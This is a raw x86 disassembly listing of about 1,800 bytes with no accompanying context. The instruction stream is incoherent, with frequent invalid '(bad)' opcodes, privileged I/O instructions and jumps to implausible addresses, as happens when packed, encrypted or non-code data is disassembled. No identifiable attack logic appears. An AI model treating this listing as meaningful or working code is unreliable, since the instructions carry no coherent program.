  4101ba:	adc    BYTE PTR [ebx+esi*2],ch
  4101bd:	sub    al,0xbf
  4101bf:	retf   
  4101c0:	mov    ds:0xa3b66d06,eax
  4101c5:	daa    
  4101c6:	call   0x47e:0x44a36b3f
  4101cd:	pop    ebp
  4101ce:	clc    
  4101cf:	pop    ds
  4101d0:	add    esi,DWORD PTR ds:0xb1d9096a
  4101d6:	xchg   DWORD PTR [esi],edx
  4101d8:	pop    edi
  4101d9:	mov    esi,0x5d6fde6f
  4101de:	ins    DWORD PTR es:[edi],dx
  4101df:	(bad)  
  4101e0:	and    edx,DWORD PTR [esi]
  4101e2:	popa   
  4101e3:	sub    al,0xe
  4101e5:	mov    ebp,0xe2cc6786
  4101ea:	xchg   BYTE PTR [esi-0xd],ah
  4101ed:	sub    al,0x66
  4101ef:	(bad)  
  4101f0:	lahf   
  4101f1:	push   ebp
  4101f3:	popa   
  4101f4:	retf   
  4101f5:	lock inc esi
  4101f7:	push   eax
  4101f8:	adc    BYTE PTR [eax-0x75],ah
  4101fb:	(bad)  
  4101fc:	jmp    0x9e2344b9
  410201:	mov    al,BYTE PTR [ebx-0x5a]
  410204:	mov    bl,0x60
  410206:	ins    DWORD PTR es:[edi],dx
  410207:	lods   al,BYTE PTR ds:[esi]
  410208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410209:	xchg   edx,eax
  41020a:	vdivss xmm7,xmm5,DWORD PTR [eax]
  41020e:	lock int 0x90
  410211:	and    ecx,0x31
  410214:	jne    0x410235
  410216:	mov    eax,0x290b0574
  41021b:	std    
  41021c:	jb     0x4101e1
  41021e:	add    al,0x56
  410220:	xchg   ecx,eax
  410221:	inc    ebx
  410222:	mov    ecx,0x30121dc6
  410227:	imul   edx,DWORD PTR [edi+0x61],0x42
  41022b:	sbb    BYTE PTR [edx+ebx*4],al
  41022e:	mov    bh,0x99
  410230:	and    esi,esp
  410232:	jmp    0xf309c08d
  410237:	fnstsw WORD PTR [esi-0x54]
  41023a:	adc    ecx,0x476faacf
  410240:	dec    esp
  410241:	popa   
  410242:	std    
  410243:	xor    BYTE PTR [ebx-0x7],bh
  410246:	sti    
  410247:	imul   edx,ebp,0x1c
  41024a:	sbb    eax,DWORD PTR [ecx-0x679e7ae1]
  410250:	sbb    al,0x10
  410252:	les    esi,FWORD PTR [edi-0x2db8114]
  410258:	dec    ecx
  410259:	jo     0x41028f
  41025b:	or     al,0xc0
  41025d:	dec    esp
  41025e:	and    ebp,DWORD PTR [eax-0x26]
  410261:	dec    ecx
  410262:	adc    ebp,DWORD PTR [ecx+eiz*4]
  410265:	inc    esi
  410266:	jns    0x4101f8
  410268:	imul   ecx,eax,0x805b3e64
  41026e:	lds    esi,FWORD PTR [esi+0x11]
  410271:	mov    dh,0x94
  410273:	stos   BYTE PTR es:[edi],al
  410274:	sbb    ebp,ecx
  410276:	test   eax,0x693fe56e
  41027b:	dec    ebp
  41027c:	fidivr DWORD PTR [ebx]
  41027e:	jge    0x41028b
  410280:	cmp    bh,BYTE PTR [esi-0x15]
  410283:	les    edx,FWORD PTR [edx+ebp*8]
  410286:	(bad)  
  410287:	mov    al,dh
  410289:	jmp    0x4102f2
  41028b:	aas    
  41028c:	ins    BYTE PTR es:[edi],dx
  41028d:	fwait
  41028e:	sbb    esp,DWORD PTR [edi]
  410290:	bound  ebx,QWORD PTR [edi+edi*2-0x143142e9]
  410297:	ins    BYTE PTR es:[edi],dx
  410298:	sbb    ch,BYTE PTR [ebx]
  41029a:	add    al,0x1d
  41029c:	int3   
  41029d:	mov    ebx,0x3bebb2fe
  4102a2:	pop    ebp
  4102a3:	out    0xbd,al
  4102a5:	lods   al,BYTE PTR ds:[esi]
  4102a6:	inc    esp
  4102a7:	inc    ebx
  4102a8:	jecxz  0x4102ee
  4102aa:	ins    BYTE PTR es:[edi],dx
  4102ab:	bound  edi,QWORD PTR [ecx-0x3a87ddef]
  4102b1:	aaa    
  4102b2:	xchg   BYTE PTR [ebx+0x3fffaf9d],bl
  4102b8:	jl     0x410265
  4102ba:	or     ecx,DWORD PTR [eax+0x6cad58d9]
  4102c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c1:	sbb    esi,DWORD PTR [ebp-0x72]
  4102c4:	arpl   WORD PTR [eax*4+0x671343a7],cx
  4102cb:	bound  esi,QWORD PTR [edx+0xc]
  4102ce:	push   ecx
  4102cf:	int    0xdd
  4102d1:	push   0xfffffff4
  4102d3:	or     edx,edx
  4102d5:	loopne 0x4102b0
  4102d7:	aas    
  4102d8:	mov    ebx,0x7a337eb5
  4102dd:	inc    ebx
  4102de:	jno    0x410324
  4102e0:	rol    BYTE PTR [esi+0x71],0x35
  4102e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102e5:	jb     0x410361
  4102e7:	fld    TBYTE PTR [esi+edx*1]
  4102ea:	lods   al,BYTE PTR ds:[esi]
  4102eb:	adc    DWORD PTR [ebp+0x3a],0x62
  4102ef:	add    ebp,DWORD PTR [ebx-0x3a]
  4102f2:	(bad)  
  4102f4:	mov    bh,0x24
  4102f6:	clc    
  4102f7:	mov    dl,BYTE PTR [esi]
  4102f9:	sbb    eax,0x39df0027
  4102fe:	test   eax,0x516730a7
  410303:	add    BYTE PTR [edx+0x7417bf4c],dh
  410309:	sub    ah,bh
  41030b:	jecxz  0x410342
  41030d:	not    ecx
  41030f:	aaa    
  410310:	jb     0x410315
  410312:	test   BYTE PTR [eax-0x6e],0xee
  410316:	sahf   
  410317:	das    
  410318:	mov    eax,ds:0x68b2f68e
  41031d:	mov    eax,edi
  41031f:	aaa    
  410320:	push   eax
  410321:	cld    
  410322:	adc    al,0x2f
  410324:	add    dl,BYTE PTR [eax+0x27522b30]
  41032a:	mov    bl,0xa0
  41032c:	mov    ?,WORD PTR [eax]
  41032e:	cli    
  41032f:	push   cs
  410330:	test   BYTE PTR [edx],bl
  410332:	std    
  410333:	outs   dx,DWORD PTR ds:[esi]
  410334:	xchg   DWORD PTR [edi+0x236fc49d],esp
  41033a:	mov    esi,0xb241a7b
  41033f:	jg     0x4102f3
  410341:	jno    0x4103b4
  410343:	cs aaa 
  410345:	out    0x5d,al
  410347:	ss into 
  410349:	xchg   edi,eax
  41034a:	stc    
  41034b:	jp     0x41037b
  41034d:	stos   DWORD PTR es:[edi],eax
  41034e:	arpl   WORD PTR [edx],bp
  410350:	leave  
  410351:	and    edi,edx
  410353:	iret   
  410354:	mov    edi,0x8e12fd0d
  410359:	repnz sbb BYTE PTR [edx+eax*2+0x1a],0xe3
  41035f:	cli    
  410360:	inc    edx
  410361:	out    dx,al
  410362:	pop    es
  410363:	shl    DWORD PTR [ecx+0x6],1
  410366:	mov    cs,WORD PTR [edx+0x673ddfb5]
  41036c:	iret   
  41036d:	pop    esp
  41036e:	lods   al,BYTE PTR ds:[esi]
  41036f:	test   DWORD PTR [ebp-0x5],eax
  410372:	ret    0xd8db
  410375:	addr16 adc bh,dh
  410378:	mov    bl,0xcb
  41037a:	xchg   DWORD PTR [esi-0xf],edi
  41037d:	mov    DWORD PTR [ebp+0x22455cb2],edx
  410383:	fidiv  DWORD PTR [ecx]
  410385:	jno    0x41033f
  410387:	(bad)  
  410388:	bnd js 0x410406
  41038b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41038c:	fiadd  WORD PTR [edi]
  41038e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41038f:	sbb    ebp,DWORD PTR es:[eax-0x47]
  410393:	inc    ebx
  410394:	sbb    edi,DWORD PTR [edx+ebp*8+0x47]
  410398:	stc    
  410399:	js     0x4103ec
  41039b:	adc    esi,DWORD PTR [ecx+0x34]
  41039e:	js     0x41041f
  4103a0:	lock or al,dh
  4103a3:	test   eax,0x9f3089d6
  4103a8:	push   esi
  4103a9:	add    BYTE PTR [ebx],ch
  4103ab:	in     ax,0x2a
  4103ae:	cdq    
  4103af:	fisub  DWORD PTR [ecx-0x71]
  4103b2:	ins    DWORD PTR es:[edi],dx
  4103b3:	(bad)  
  4103b4:	(bad)  
  4103b5:	cmp    al,BYTE PTR [ecx-0x7ac7eb46]
  4103bb:	jecxz  0x41041f
  4103bd:	mov    esi,DWORD PTR [ebx]
  4103bf:	aad    0xb5
  4103c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103c2:	int3   
  4103c3:	iret   
  4103c4:	(bad)  
  4103c5:	cmp    BYTE PTR [edx+0x4a93edf9],dl
  4103cb:	xchg   ebp,eax
  4103cc:	push   es
  4103cd:	dec    esp
  4103ce:	fs inc esi
  4103d0:	mov    esi,0xca86b37c
  4103d5:	dec    eax
  4103d6:	iret   
  4103d7:	mov    ebx,0xacab0fd1
  4103dc:	xchg   edi,eax
  4103dd:	sbb    eax,0x592e7d33
  4103e2:	(bad)  
  4103e3:	xchg   esi,eax
  4103e4:	or     bh,BYTE PTR [eax-0x3d]
  4103e7:	ja     0x4103b3
  4103e9:	inc    ebp
  4103ea:	out    0xa9,eax
  4103ec:	clc    
  4103ed:	dec    edx
  4103ee:	mov    bh,0x39
  4103f0:	inc    edx
  4103f1:	adc    al,0x7d
  4103f3:	push   ecx
  4103f4:	jmp    0x4103c2
  4103f6:	fcmovnu st,st(1)
  4103f8:	nop
  4103f9:	dec    esp
  4103fa:	stos   BYTE PTR es:[edi],al
  4103fb:	mov    ds:0xeacd25cb,eax
  410400:	push   esi
  410401:	jnp    0x4103cf
  410403:	sbb    DWORD PTR [edx-0x62600785],ebp
  410409:	or     esp,edi
  41040b:	hlt    
  41040c:	call   0x527fc53c
  410411:	xchg   edx,eax
  410412:	cwde   
  410413:	mov    edx,0x3a350fd1
  410418:	clc    
  410419:	fdivr  DWORD PTR [edx+eiz*1+0x1d9c7312]
  410420:	xor    eax,0x6c7151a2
  410425:	push   ebx
  410426:	cmp    al,0xd6
  410428:	or     eax,0xca42273e
  41042d:	iret   
  41042e:	shr    ah,cl
  410430:	adc    ah,BYTE PTR [esi-0xbf4f1a8]
  410436:	in     eax,0x4d
  410438:	out    0x24,al
  41043a:	icebp  
  41043b:	xchg   esp,eax
  41043c:	jle    0x4103ea
  41043e:	icebp  
  41043f:	fwait
  410440:	jb     0x410424
  410442:	cs push edx
  410444:	or     BYTE PTR [edx],dl
  410446:	sub    eax,0xd261c4a0
  41044b:	(bad)  
  41044c:	scas   al,BYTE PTR es:[edi]
  41044d:	rcl    DWORD PTR ds:0xfb2f504d,1
  410453:	and    ebx,DWORD PTR ds:0x72c86652
  410459:	cmp    al,BYTE PTR [ebx]
  41045b:	push   eax
  41045c:	sub    esi,ebx
  41045e:	dec    ecx
  41045f:	lea    esi,[ecx]
  410461:	push   edx
  410462:	xor    ecx,DWORD PTR [ecx]
  410464:	sub    edi,ecx
  410466:	addr16 dec edi
  410468:	ror    DWORD PTR [ebp+0x516fb045],cl
  41046e:	pusha  
  41046f:	jno    0x410437
  410471:	scas   al,BYTE PTR es:[edi]
  410472:	xor    edx,ebp
  410474:	xchg   edi,eax
  410475:	jae    0x4104d2
  410477:	or     BYTE PTR [ebx+0x0],dh
  41047a:	push   esi
  41047b:	shl    BYTE PTR [edx-0x6d3afd13],1
  410481:	push   eax
  410482:	mov    dh,0x92
  410484:	mov    al,ds:0x7ba44ca2
  410489:	lock adc DWORD PTR ds:0x6d9a231e,0xffffffd6
  410491:	mov    cs,WORD PTR [esi]
  410493:	clc    
  410494:	mov    esi,DWORD PTR [edi-0x5deb3cf1]
  41049a:	fdiv   DWORD PTR [ecx+0xcb313d0]
  4104a0:	(bad)  
  4104a1:	mov    bl,0x75
  4104a3:	xor    BYTE PTR [edi+0x24f82a7],dl
  4104a9:	dec    esi
  4104aa:	ins    BYTE PTR es:[edi],dx
  4104ab:	(bad)  
  4104ad:	imul   esi,DWORD PTR [edx-0x5d],0xfffffffc
  4104b1:	lods   eax,DWORD PTR ds:[esi]
  4104b2:	jle    0x4104af
  4104b4:	xor    eax,0x5abc2604
  4104b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104ba:	cmc    
  4104bb:	xor    esi,0xffffffba
  4104be:	fadd   st(3),st
  4104c0:	sbb    bl,BYTE PTR [ebx]
  4104c2:	lods   eax,DWORD PTR ds:[si]
  4104c4:	lds    edx,FWORD PTR ds:0x577dd5b8
  4104ca:	scas   eax,DWORD PTR es:[edi]
  4104cb:	xchg   BYTE PTR [ecx+eax*2-0x7d],cl
  4104cf:	jne    0x4104f5
  4104d1:	out    0x5a,al
  4104d3:	xchg   edx,eax
  4104d4:	jns    0x41051b
  4104d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104d7:	mov    cl,0x1a
  4104d9:	push   ecx
  4104da:	(bad)
  4104de:	mov    eax,esp
  4104e0:	pop    esp
  4104e1:	fimul  WORD PTR [ebx+ecx*1]
  4104e4:	ret    
  4104e5:	dec    eax
  4104e6:	push   ebx
  4104e7:	xchg   edi,eax
  4104e8:	add    al,0x5d
  4104ea:	(bad)  
  4104eb:	fdivr  st(3),st
  4104ed:	or     bh,BYTE PTR cs:[edx-0x6f]
  4104f1:	pop    ebp
  4104f2:	cmp    BYTE PTR [edi-0x13],bl
  4104f5:	jno    0x41054a
  4104f7:	cmc    
  4104f8:	out    0x62,eax
  4104fa:	push   eax
  4104fb:	mov    ecx,0xe1f6770e
  410500:	jnp    0x410492
  410502:	jno    0x410519
  410504:	pushf  
  410505:	das    
  410506:	jae    0x41057d
  410508:	lahf   
  410509:	ret    0x6d83
  41050c:	mov    edx,0x4f89c2bd
  410511:	retf   0x1203
  410514:	(bad)  
  410515:	adc    eax,0xaa80e654
  41051a:	outs   dx,BYTE PTR ds:[esi]
  41051b:	sbb    eax,0xa375eff2
  410520:	sub    BYTE PTR [edi],ch
  410522:	out    dx,al
  410523:	or     BYTE PTR [edx],cl
  410525:	sub    eax,0x35de6802
  41052a:	jmp    0x6d60:0x11c28005
  410531:	repnz aas 
  410533:	out    dx,al
  410534:	ss pop eax
  410536:	push   0x40526593
  41053b:	repnz pop ss
  41053d:	bound  esp,QWORD PTR [eax]
  41053f:	fs (bad) 
  410541:	push   ebp
  410542:	push   0xffffffba
  410544:	mov    ds:0xe0e8b46d,al
  410549:	popa   
  41054a:	in     al,dx
  41054b:	or     BYTE PTR ds:0x4d3a70cd,0xf2
  410552:	clc    
  410553:	cmp    cl,BYTE PTR [ebp-0x5f]
  410556:	call   DWORD PTR [ecx+edx*8]
  410559:	call   0x5f6ce057
  41055e:	fld    QWORD PTR [eax]
  410560:	push   ecx
  410561:	pop    es
  410562:	inc    ebp
  410563:	fsubr  QWORD PTR [edx-0xb9a574]
  410569:	rcr    DWORD PTR [eax+0x2b],1
  41056c:	xchg   ecx,eax
  41056d:	fisub  DWORD PTR [edx+eax*1]
  410570:	xor    eax,esp
  410572:	inc    edx
  410573:	xchg   edx,eax
  410574:	imul   ecx,DWORD PTR [esi-0x7],0x46
  410578:	push   0xffffffe7
  41057a:	sti    
  41057b:	xchg   ebp,eax
  41057c:	pop    esi
  41057d:	adc    al,0xd5
  41057f:	sbb    DWORD PTR [edi+0x750ebcbd],eax
  410585:	imul   edx,DWORD PTR [eax],0x50
  410588:	ja     0x4105f5
  41058a:	xor    BYTE PTR [edx],0xbd
  41058d:	loope  0x4105ec
  41058f:	into   
  410590:	push   esi
  410591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410592:	imul   edx,esp,0xc9fd0996
  410598:	popf   
  410599:	sahf   
  41059a:	adc    edx,esp
  41059c:	cmp    DWORD PTR [edi+0x2],0x65ccc884
  4105a3:	cmp    cl,0xc0
  4105a6:	adc    al,0x20
  4105a8:	cmp    ebp,DWORD PTR [edi+0x67]
  4105ab:	sbb    al,ah
  4105ad:	jno    0x410537
  4105af:	inc    ebp
  4105b0:	add    DWORD PTR [ecx-0x651ec74d],edi
  4105b6:	rol    bl,1
  4105b8:	repnz (bad) 
  4105ba:	ds mov ebp,0xa87a6d8
  4105c0:	mov    ?,edi
  4105c2:	or     al,0x95
  4105c4:	dec    edi
  4105c5:	div    DWORD PTR [edx+ecx*4]
  4105c8:	inc    ebp
  4105c9:	and    ecx,DWORD PTR [edx+0x3b74f42]
  4105cf:	es call 0x1426:0xf0065ce0
  4105d7:	call   0xfd615a64
  4105dc:	xchg   esp,eax
  4105dd:	leave  
  4105de:	imul   ecx,DWORD PTR [esi+0x22338d26],0x30053554
  4105e8:	cmp    DWORD PTR [edx+0x6f94f838],esi
  4105ee:	dec    ebx
  4105ef:	jp     0x4105d5
  4105f1:	push   ss
  4105f2:	nop
  4105f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105f4:	int3   
  4105f5:	xchg   esp,eax
  4105f6:	ret    0xdb90
  4105f9:	cmp    ecx,DWORD PTR [ebp+0x135f2835]
  4105ff:	loope  0x4105af
  410601:	ss repz loop 0x4105f0
  410605:	sbb    DWORD PTR [ebx-0x2182728c],ebx
  41060b:	scas   eax,DWORD PTR es:[edi]
  41060c:	sahf   
  41060d:	pop    edi
  41060e:	test   al,0x37
  410610:	mov    dh,0xcd
  410612:	sbb    al,0xce
  410614:	es scas al,BYTE PTR es:[edi]
  410616:	js     0x4105e8
  410618:	repz sbb al,0x86
  41061b:	jns    0x4105ca
  41061d:	inc    esp
  41061e:	push   ss
  41061f:	and    eax,0x221f4a2d
  410624:	xchg   edi,eax
  410625:	(bad)  
  410626:	stc    
  410627:	shr    DWORD PTR [ecx],0x56
  41062a:	pop    edx
  41062b:	dec    esi
  41062c:	push   eax
  41062d:	mov    ch,0xe4
  41062f:	mov    WORD PTR [edx],es
  410631:	adc    BYTE PTR [ebx+0x5b],ah
  410634:	jb     0x4105ee
  410636:	dec    esi
  410637:	mov    edx,0x1606e253
  41063c:	loope  0x4105e2
  41063e:	lds    edx,FWORD PTR [edx]
  410640:	pop    esp
  410641:	mov    ah,0x96
  410643:	int3   
  410644:	fs mov bl,0x94
  410647:	je     0x4105da
  410649:	out    0x21,eax
  41064b:	in     al,dx
  41064c:	mov    ecx,0x797ebc91
  410651:	fstp   QWORD PTR [esi+0x69c21b1a]
  410657:	or     al,0xd2
  410659:	pop    ss
  41065a:	xor    eax,0x51a47c62
  41065f:	jb     0x410649
  410661:	sbb    ebp,ebx
  410663:	mov    bh,0x41
  410665:	les    edi,FWORD PTR [esi-0x39]
  410668:	loop   0x410690
  41066a:	sahf   
  41066b:	neg    DWORD PTR [ecx+0x725b86e7]
  410671:	cld    
  410672:	cmp    al,0x85
  410674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410675:	cmp    DWORD PTR [ebp+0x419de62a],ebp
  41067b:	push   ds
  41067c:	mov    edx,0x6b0bf1f6
  410681:	cmp    al,0x7a
  410683:	out    dx,eax
  410684:	inc    esp
  410685:	daa    
  410686:	cmp    DWORD PTR [edx-0x68],eax
  410689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068a:	repnz and BYTE PTR [eax+0x6a],al
  41068e:	cmp    DWORD PTR [ebx+ebp*2],esp
  410691:	pop    edx
  410692:	fcmovnb st,st(0)
  410694:	imul   esi,DWORD PTR [ecx+0x13],0x29
  410698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410699:	sub    BYTE PTR [ebp-0x5efe8d41],ah
  41069f:	pop    ds
  4106a0:	stc    
  4106a1:	sbb    al,0x5b
  4106a3:	enter  0xb040,0xcd
  4106a7:	jecxz  0x4106af
  4106a9:	mov    cl,0x7d
  4106ab:	mov    ds:0xad59b99b,eax
  4106b0:	cld    
  4106b1:	xor    ecx,DWORD PTR [esi+0x6d]
  4106b4:	dec    ebx
  4106b5:	fild   DWORD PTR [ebp-0x560d5c0c]
  4106bb:	sub    eax,0x3f350630
  4106c0:	dec    edi
  4106c1:	lds    ecx,FWORD PTR [eax+edx*2]
  4106c4:	fisubr WORD PTR [eax]
  4106c6:	adc    bl,BYTE PTR [edx+0x38f78473]
  4106cc:	retf   0xcf26
  4106cf:	aas    
  4106d0:	fwait
  4106d1:	jmp    DWORD PTR [esi]
  4106d3:	or     edx,DWORD PTR [eax+0x77]
  4106d6:	xchg   ebx,eax
  4106d7:	adc    eax,0x25fcda29
  4106dc:	iret   
  4106dd:	addr16 pushf 
  4106df:	push   es
  4106e0:	push   0x68
  4106e2:	out    0x4d,eax
  4106e4:	mov    BYTE PTR [eax+eax*2-0x7bf6fd4a],ah
  4106eb:	sub    DWORD PTR [edx+0x3d],esp
  4106ee:	mov    bh,0xfd
  4106f0:	in     eax,dx
  4106f1:	or     esi,DWORD PTR [edx+0x3ff12c60]
  4106f7:	push   esp
  4106f8:	sbb    edi,DWORD PTR [ebp-0x7a]
  4106fb:	enter  0x4e4c,0xde
  4106ff:	and    BYTE PTR [ebx-0x48],bl
  410702:	mov    ds:0x869e3ab,al
  410707:	sbb    bh,bh
  410709:	adc    DWORD PTR [ebp+0x546de54e],eax
  41070f:	pop    edx
  410710:	mov    ds:0x248a4e72,eax
  410715:	xor    DWORD PTR [ecx],eax
  410717:	lods   al,BYTE PTR ds:[esi]
  410718:	ffree  st(1)
  41071a:	inc    edx
  41071b:	pop    ecx
  41071c:	adc    eax,0x89fd1f00
  410721:	js     0x410741
  410723:	pop    ebp
  410724:	xchg   esp,eax
  410725:	aaa    
  410726:	inc    esp
  410728:	mov    al,ds:0x4ac8afe4
  41072d:	fst    DWORD PTR [esp+eax*2-0x6cb66764]
  410734:	jnp    0x41074c
  410736:	jae    0x41074e
  410738:	mov    ecx,0x4fe875a8
  41073d:	push   edi
  41073e:	into   
  41073f:	scas   al,BYTE PTR es:[edi]
  410740:	adc    al,0x27
  410742:	sbb    bh,ch
  410744:	add    ebx,DWORD PTR [edx-0xeac5c0a]
  41074a:	add    eax,0x8dce9f0
  41074f:	rcr    edi,0xb1
  410752:	cmp    DWORD PTR [edi+0x2e54044],edx
  410758:	sar    eax,1
  41075a:	and    esp,DWORD PTR [ebp-0x43c94b4f]
  410760:	adc    edi,edi
  410762:	fstp   QWORD PTR [edi]
  410764:	mov    al,ds:0x52d95967
  410769:	mov    eax,ds:0x6a090393
  41076e:	in     eax,dx
  41076f:	pop    esp
  410770:	sar    DWORD PTR [ecx],0x27
  410773:	sbb    esp,eax
  410775:	ds add al,0x41
  410778:	fadd   DWORD PTR [ecx+0x2e]
  41077b:	je     0x410716
  41077d:	push   eax
  41077e:	mov    ds:0x4e70acb2,eax
  410783:	aam    0xea
  410785:	pop    es
  410786:	cmp    eax,0x9f0c8d5f
  41078b:	mov    ds:0xd25dd82b,eax
  410790:	sbb    ebp,DWORD PTR [eax-0x67]
  410793:	shrd   DWORD PTR [eax+0x6a6ad90d],ecx,0xf1
  41079b:	into   
  41079c:	(bad)  
  41079d:	xchg   ebx,eax
  41079e:	xchg   edi,eax
  41079f:	jae    0x41073b
  4107a1:	jmp    0x62de:0x97abcba
  4107a8:	mov    esi,0xef07d881
  4107ad:	aas    
  4107ae:	mov    ah,0xfb
  4107b0:	mov    BYTE PTR [edx+0x319595b2],bl
  4107b6:	sti    
  4107b7:	jnp    0x4107d4
  4107b9:	ss std 
  4107bb:	or     BYTE PTR [ecx+0x3c],0xbf
  4107bf:	repz sub ah,BYTE PTR [esi-0x2c]
  4107c3:	(bad)  [ecx+0x4e8f3da1]
  4107c9:	xchg   ebp,eax
  4107ca:	jbe    0x410805
  4107cc:	pop    es
  4107cd:	inc    ebp
  4107ce:	push   eax
  4107cf:	jge    0x4107d5
  4107d1:	cmp    DWORD PTR [edi+0x19a1f5b5],0x4e
  4107d8:	and    eax,DWORD PTR [ebx-0xa4cadc0]
  4107de:	fld    TBYTE PTR [ecx-0x17]
  4107e1:	mov    ds,WORD PTR [ecx]
  4107e3:	dec    edi
  4107e4:	push   esp
  4107e5:	daa    
  4107e6:	stos   DWORD PTR es:[edi],eax
  4107e7:	cld    
  4107e8:	std    
  4107e9:	fst    QWORD PTR [eax]
  4107eb:	lods   eax,DWORD PTR ds:[esi]
  4107ec:	in     al,0x26
  4107ee:	into   
  4107ef:	mov    ebx,0x7e58856f
  4107f4:	adc    cl,ah
  4107f6:	jle    0x41085e
  4107f8:	mov    esp,0x7bbb223
  4107fd:	sbb    dl,cl
  4107ff:	retf   
  410800:	sar    BYTE PTR [esi-0x9],0xac
  410804:	mov    al,ds:0x5f45368e
  410809:	cmp    al,0xcb
  41080b:	and    BYTE PTR [ecx+0x19],dl
  41080e:	pop    ss
  41080f:	mov    bl,0x88
  410811:	in     al,0x61
  410813:	aad    0xc
  410815:	retf   
  410816:	fs and al,0x32
  410819:	ret    0x2a9c
  41081c:	out    0xfd,eax
  41081e:	mov    edi,0x53052d9c
  410823:	pop    edi
  410824:	jbe    0x410889
  410826:	retf   0x114
  410829:	les    esp,FWORD PTR [edi+0x69]
  41082c:	popf   
  41082d:	in     al,0x6
  41082f:	sub    DWORD PTR [edi+ebx*2],edi
  410832:	out    0x89,eax
  410834:	xor    DWORD PTR [ebp+0x7d524d06],0x3d2b6f3f
  41083e:	sub    al,0xd6
  410840:	loope  0x41083c
  410842:	push   eax
  410843:	icebp  
  410844:	jle    0x4108ae
  410846:	pop    ss
  410847:	xchg   ebp,edx
  410849:	fsubr  DWORD PTR es:[edi+ecx*4-0x2d8f7068]
  410851:	pop    edi
  410852:	push   0x28a5a2ec
  410857:	or     cl,bl
  410859:	or     ch,BYTE PTR [ecx+0x19]
  41085c:	mov    bl,0xf2
  41085e:	or     BYTE PTR [eiz*8+0x4bca2722],ah
  410865:	neg    BYTE PTR [edi-0x41]
  410868:	cmp    esi,DWORD PTR [esp]
  41086b:	xor    BYTE PTR [ebx],ch
  41086d:	fbld   TBYTE PTR [edx-0x3d218db7]
  410873:	jbe    0x4108dd
  410875:	pop    es
  410876:	or     eax,0xd6eeabd0
  41087b:	ja     0x4108f4
  41087d:	xchg   esi,eax
  41087e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41087f:	jne    0x410855
  410881:	push   ecx
  410882:	fwait
  410883:	aas    
  410884:	inc    esp
  410885:	shl    DWORD PTR [ecx+0x19],cl
  410888:	in     al,0xab
  41088a:	mov    BYTE PTR [ebp+0x76],dh
  41088d:	inc    edi
  41088e:	jo     0x4108c3
  410890:	shr    DWORD PTR [ecx],cl
  410892:	mov    dh,0x1f
  410894:	mov    ah,0x6f
  410896:	xchg   BYTE PTR [eax+0x665b41f1],cl
  41089c:	mov    eax,ds:0x40fb4861
  4108a1:	inc    ebx
  4108a2:	pop    ss
  4108a3:	cwde   
  4108a4:	in     eax,0x1e
  4108a6:	push   eax
  4108a7:	push   edx
  4108a8:	xlat   BYTE PTR ds:[ebx]
  4108a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108aa:	lods   al,BYTE PTR ds:[esi]
  4108ab:	call   DWORD PTR [ebx+edx*2]
  4108ae:	bound  ebp,QWORD PTR [edx+0x31877c9d]
  4108b4:	or     eax,0xda03b17a
  4108b9:	mov    ebx,DWORD PTR [edx+0x4c]
  4108bc:	pop    ebx
  4108bd:	jno    0x41088e
  4108bf:	jle    0x4108b1
  4108c1:	pop    eax
  4108c2:	ret    
  4108c3:	neg    DWORD PTR [esi]
  4108c5:	sbb    al,0x4a
  4108c7:	stc    
  4108c8:	jne    0x4108d3
  4108ca:	arpl   WORD PTR [edx+0x76],cx
  4108cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ce:	or     eax,0x114ae1cc
  4108d3:	or     eax,0xfcf95e58
  4108d8:	and    DWORD PTR [esi-0x552fbf71],ebp
  4108de:	sbb    al,0x92
  4108e0:	adc    al,0x7
  4108e2:	outs   dx,BYTE PTR ds:[esi]
  4108e3:	and    al,0xef
  4108e5:	out    0x51,eax
  4108e7:	sub    esp,0x53ec1f4f
  4108ed:	xchg   ebp,eax
  4108ee:	rol    DWORD PTR [ebp-0x5926c2d7],1
  4108f4:	push   ss
  4108f5:	push   ds
  4108f6:	mov    edi,0xe38aa9e5
  4108fb:	mov    esp,0xb3c51560
  410900:	xlat   BYTE PTR ds:[ebx]
  410901:	test   eax,0x263b5d52
  410906:	sub    BYTE PTR ds:[ecx+0x17de5222],al
  41090d:	dec    edi
  41090e:	sbb    DWORD PTR [ecx-0x15],0xdc755a40
  410915:	inc    BYTE PTR [eax-0xb0bff9]
  41091b:	xchg   esp,eax
  41091c:	int    0x58
  41091e:	in     eax,dx
  41091f:	(bad)  
  410920:	dec    edx
  410921:	and    dh,BYTE PTR [ebx+edi*4-0x2223aeff]
  410928:	lahf   
  410929:	(bad)  
  41092a:	xor    ecx,DWORD PTR [edx]
  41092c:	inc    ebx
  41092d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41092e:	loop   0x4108bf
  410930:	mov    es,WORD PTR [ebx-0x7cdec3aa]
  410936:	outs   dx,BYTE PTR ds:[esi]
  410937:	sbb    al,al
  410939:	pushf  
  41093a:	outs   dx,DWORD PTR ds:[esi]
  41093b:	mov    BYTE PTR [ebp+0x2f],al
  41093e:	xchg   esi,eax
  41093f:	aad    0x4
  410941:	(bad)  
  410942:	push   ebx
  410943:	fmul   st,st(0)
  410945:	fidivr WORD PTR ds:0x3e7ef59f
  41094b:	inc    eax
  41094c:	add    DWORD PTR [ecx],0xa5d352d5
  410952:	sbb    edx,ebp
  410954:	outs   dx,BYTE PTR ds:[esi]
  410955:	xchg   esp,eax
  410956:	jns    0x4108e1
  410958:	bound  esi,QWORD PTR [bp-0x5f44]
  41095d:	dec    eax
  41095e:	add    dl,ah
  410960:	mov    dh,0x83
  410962:	arpl   WORD PTR ds:0xf48b1dff,di
  410968:	sahf   
  410969:	sub    eax,0xfe554d61
  41096e:	and    al,0x4f
